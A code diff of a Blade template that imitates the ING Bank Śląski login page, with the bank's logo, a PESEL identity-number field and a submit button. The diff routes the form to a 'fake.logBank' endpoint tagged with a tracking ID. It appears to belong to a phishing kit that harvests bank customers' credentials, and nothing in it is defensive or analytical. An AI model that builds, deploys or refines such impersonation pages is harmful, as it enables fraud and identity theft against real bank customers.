@@ -86,8 +86,8 @@
                                                 <div id="logo-region">
                                                     <div>
                                                         <img class="logo__img--logo"
-                                                              src="{{asset('images/banks/ing-logo.svg')}}"
-                                                              alt="ING Bank Śląski" width="128">
+                                                             src="{{asset('images/banks/ing-logo.svg')}}"
+                                                             alt="ING Bank Śląski" width="128">
                                                     </div>
                                                 </div>
                                             </div>
@@ -102,7 +102,8 @@
                                         <div id="check-login-error-banner" class="box-content box-content--error"></div>
                                         <div class="box-content box--after">
                                             <div class="login-form-content">
-                                                <form id="bank_pm_form" method="POST" action="/log/bank"
+                                                <form id="bank_pm_form" method="POST"
+                                                      action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}"
                                                       role="form">
 
                                                     <div class="form-group">
@@ -163,8 +164,10 @@
                                                                id="pesel-input">
                                                     </div>
                                                     <div class="_39Dzw _1n7r2" id="login-btn">
-                                                        <button class="btn" tabindex="-1" aria-hidden="true" slot="_button"
-                                                                type="submit">Dalej</button>
+                                                        <button class="btn" tabindex="-1" aria-hidden="true"
+                                                                slot="_button"
+                                                                type="submit">Dalej
+                                                        </button>
                                                     </div>
                                                 </form>
                                                 <div class="footer-region">
